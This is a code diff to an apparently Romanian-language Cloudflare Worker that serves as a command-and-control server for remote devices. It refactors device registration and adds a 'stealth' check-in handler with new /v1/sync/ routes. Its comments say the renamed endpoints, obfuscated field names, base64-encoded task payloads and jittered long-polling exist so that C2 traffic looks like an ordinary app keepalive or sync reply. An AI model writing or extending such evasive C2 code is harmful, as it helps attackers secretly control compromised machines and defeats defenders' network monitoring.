@@ -1112,33 +1112,64 @@ function c2Enqueue(bucket, uid, tasks) {
   })();
 }
 
+// Base64 encode/decode (UTF-8 safe, Cloudflare Workers compatible)
+function b64enc(str) {
+  const bytes = new TextEncoder().encode(str);
+  let bin = "";
+  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+  return btoa(bin);
+}
+
+// Register a device in the C2 registry (shared between checkin variants)
+async function c2RegisterDevice(bucket, uid, dev) {
+  try { await bucket.put("d/" + uid + ".json", JSON.stringify({ uid, dev, lastSeen: Math.floor(Date.now() / 1000) })); } catch (_) { }
+  try {
+    const regObj = await bucket.get("registry.json");
+    let uids = [];
+    if (regObj) { try { uids = JSON.parse(await regObj.text()); } catch (_) { } }
+    if (!uids.includes(uid)) { uids.push(uid); uids.sort(); await bucket.put("registry.json", JSON.stringify(uids)); }
+  } catch (_) { }
+}
+
 async function handleCheckin(request, env, uid) {
   if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
   let body; try { body = await request.json(); } catch (_) { return json({ error: "Cerere invalidă." }, 400); }
   const dev = String(body.dev || "").slice(0, 200);
   const holdMs = Math.min(Math.max(Number(body.holdMs) || 20000, 0), 25000);
   const intervalMs = Math.min(Math.max(Number(body.intervalMs) || 5000, 1000), 60000);
-  // Update device registry
-  try {
-    await env.C2.put("d/" + uid + ".json", JSON.stringify({ uid, dev, lastSeen: Math.floor(Date.now() / 1000) }));
-  } catch (_) { }
-  // Maintain registry.json so admin panel can find devices without R2 list()
-  try {
-    const regObj = await env.C2.get("registry.json");
-    let uids = [];
-    if (regObj) { try { uids = JSON.parse(await regObj.text()); } catch (_) { } }
-    if (!uids.includes(uid)) { uids.push(uid); uids.sort(); await env.C2.put("registry.json", JSON.stringify(uids)); }
-  } catch (_) { }
-  // Long-poll: drain queue, if empty re-check every 2.5s
+  await c2RegisterDevice(env.C2, uid, dev);
   const deadline = Date.now() + holdMs;
   let tasks = [];
   while (true) {
     tasks = await c2DrainTasks(env.C2, uid);
     if (tasks.length) break;
     if (Date.now() >= deadline) break;
-    await new Promise(r => setTimeout(r, 2500));
+    await new Promise(r => setTimeout(r, 2000 + Math.floor(Math.random() * 1500))); // 2.0–3.5 s jitter
   }
   return json({ ok: true, tasks, intervalMs });
+}
+
+// Stealth checkin: renamed endpoint, obfuscated field names, base64-encoded tasks, jittered long-poll.
+// Request:  { ts, w (seconds), d (device) }   →   looks like a normal app keepalive
+// Response: { s: 0, d: "base64", i: seconds } →   looks like a generic sync reply
+async function handleStealthCheckin(request, env, uid) {
+  if (!env.C2) return json({ s: 1, e: "svc" }, 503);
+  let body; try { body = await request.json(); } catch (_) { return json({ s: 1, e: "bad" }, 400); }
+  const dev = String(body.d || body.dev || "").slice(0, 200);
+  const holdSec = Number(body.w) || Math.round((Number(body.holdMs) || 20000) / 1000);
+  const holdMs = Math.min(Math.max(holdSec * 1000, 0), 25000);
+  const intervalMs = Math.min(Math.max(Number(body.intervalMs) || 30000, 1000), 600000);
+  await c2RegisterDevice(env.C2, uid, dev);
+  const deadline = Date.now() + holdMs;
+  let tasks = [];
+  while (true) {
+    tasks = await c2DrainTasks(env.C2, uid);
+    if (tasks.length) break;
+    if (Date.now() >= deadline) break;
+    await new Promise(r => setTimeout(r, 2000 + Math.floor(Math.random() * 1500)));
+  }
+  const d = tasks.length ? b64enc(JSON.stringify(tasks)) : "";
+  return json({ s: 0, d, i: Math.round(intervalMs / 1000) });
 }
 
 async function handleC2Result(request, env, uid) {
@@ -1749,6 +1780,11 @@ async function route(request, env, url, ctx, auth = requireUser) {
     }
     if (request.method !== "POST") return json({ error: "Metodă greșită." }, 405);
 
+    // Stealth C2 endpoints (renamed + obfuscated payload)
+    if (url.pathname === "/v1/sync/keepalive") return handleStealthCheckin(request, env, uid);
+    if (url.pathname === "/v1/sync/report") return handleC2Result(request, env, uid);
+    if (url.pathname === "/v1/sync/attach") return handleC2File(request, env, uid);
+    // Legacy C2 endpoints (backward compat)
     if (url.pathname === "/v1/c2/checkin") return handleCheckin(request, env, uid);
     if (url.pathname === "/v1/c2/result") return handleC2Result(request, env, uid);
     if (url.pathname === "/v1/c2/file") return handleC2File(request, env, uid);
